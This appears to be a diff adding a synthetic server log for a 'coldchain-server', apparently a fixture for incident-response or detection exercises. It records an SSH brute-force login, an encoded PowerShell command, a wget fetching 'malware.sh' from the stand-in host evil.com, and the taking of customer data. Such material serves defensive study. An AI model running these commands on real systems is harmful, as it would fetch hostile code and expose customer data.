@@ -1,0 +1,10 @@
+Nov 21 09:12:01 coldchain-server sshd[1234]: Failed password for admin from 192.168.1.10 port 22
+Nov 21 09:12:05 coldchain-server sshd[1234]: Failed password for admin from 192.168.1.10 port 22
+Nov 21 09:12:09 coldchain-server sshd[1234]: Failed password for admin from 192.168.1.10 port 22
+Nov 21 09:12:15 coldchain-server sshd[1234]: Failed password for admin from 192.168.1.10 port 22
+Nov 21 09:12:20 coldchain-server sshd[1234]: Failed password for admin from 192.168.1.10 port 22
+Nov 21 09:13:01 coldchain-server sshd[1234]: Accepted password for admin from 192.168.1.10 port 22
+Nov 21 09:14:10 coldchain-server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; COMMAND=/usr/bin/powershell -enc JABzAD0...
+Nov 21 09:16:30 coldchain-server sudo: admin : TTY=pts/0 ; COMMAND=/bin/cat /var/log/temperature_data.csv
+Nov 21 09:18:45 coldchain-server sudo: admin : TTY=pts/0 ; COMMAND=/usr/bin/wget http://evil.com/malware.sh
+Nov 21 09:20:00 coldchain-server CRON: admin downloaded /opt/coldchain/customer_data.db
